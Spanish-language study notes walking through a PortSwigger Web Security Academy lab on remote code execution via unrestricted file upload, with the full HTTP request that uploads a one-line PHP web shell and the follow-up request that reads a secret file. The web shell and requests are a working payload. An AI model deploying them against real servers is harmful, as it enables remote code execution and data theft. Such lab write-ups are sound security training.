---
aliases:
  - File Upload 001 - web shell PHP directo
  - direct php web shell upload
tags:
  - vuln/file-upload
  - example
  - portswigger
---

# 001 — Web shell PHP directo (sin filtro)

> Lab: Remote code execution via web shell upload · **Apprentice** · técnica → [[vulnerabilities/017-file-upload-vulnerabilities/file-upload-vulnerabilities|entry point]]

## ¿Por qué acá? (el caso base)
- **Es el punto de partida:** el form de avatar **no valida nada** → subís un `.php`, el server lo **sirve y lo ejecuta**. Todo lo demás (002–004) es este ataque + un filtro que hay que saltar.
- **Por qué funciona:** los ficheros subidos quedan servidos en `/files/avatars/…` y el servidor procesa el `.php` como código en vez de devolverlo como texto.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (host del lab) + el **comando** a ejecutar.

Interceptá la subida del avatar y meté el web shell (`example_best.php` = `system()` con salida limpia):
<pre class="payload"><code>POST /my-account/avatar HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

&lt;?php system($_GET['command']); ?&gt;
------x
Content-Disposition: form-data; name="user"

wiener
------x
Content-Disposition: form-data; name="csrf"

<mark>CSRF-TOKEN</mark>
------x--</code></pre>
Luego pedí el fichero servido y pasále el comando:
<pre class="payload"><code>GET /files/avatars/exploit.php?command=<mark>cat%20/home/carlos/secret</mark> HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark></code></pre>

## Verificación
La respuesta del GET trae **el contenido de `/home/carlos/secret`** (probá `?command=id` para confirmar RCE). Pegás el secreto en *Submit solution* → lab resuelto.

## Detalles que se pasan por alto
- Si solo querés el secreto y no un shell, subí `exploit.php` (`file_get_contents('/home/carlos/secret')`): **no lleva parámetro**, al pedirlo ya lo imprime.
- `echo system(...)` **duplica la última línea**; usá `system(...)` a secas (`example_best.php`) para salida limpia.
- El espacio del comando va como `%20` en la URL.

→ Siguiente: [[vulnerabilities/017-file-upload-vulnerabilities/examples/002-bypass-content-type|002 · el server exige que "sea imagen" → falseás el Content-Type]]
